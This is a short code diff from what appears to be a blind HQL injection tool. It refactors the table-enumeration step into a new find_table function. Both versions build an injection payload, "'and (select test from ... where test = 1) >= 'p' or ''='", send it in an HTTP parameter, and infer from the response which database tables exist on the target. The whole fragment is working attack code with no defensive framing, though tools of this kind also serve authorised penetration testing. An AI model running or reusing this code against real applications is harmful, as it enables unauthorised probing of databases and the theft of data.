@@ -87,12 +87,15 @@ def blind_hqli_injection_tables(url, params, param_to_test, file_table, blind_hq
     # removing new line
     for table in tables_to_test:
         table = remove_new_line_from_string(table)
-        params[param_to_test] = "'and (select test from " + table + " where test = 1) >= 'p' or ''='"
-        req = send_HTTP_request(url, params)
-        if (table_exists(req.content)):
-            insert_table_name_in_tables(table)
-        else:
-            display_message("[-] Table " + table + " does not exist.")            
+        find_table(url, params, param_to_test, table)
+
+def find_table(url, params, param_to_test, table_name):
+    params[param_to_test] = "'and (select test from " + table_name + " where test = 1) >= 'p' or ''='"
+    req = send_HTTP_request(url, params)
+    if (table_exists(req.content)):
+        insert_table_name_in_tables(table_name)
+    else:
+        display_message("[-] Table " + table_name + " does not exist.")            
 
 def blind_hqli_injection_columns(url, params, param_to_test, file_column, blind_hqli_message):
     global TABLES
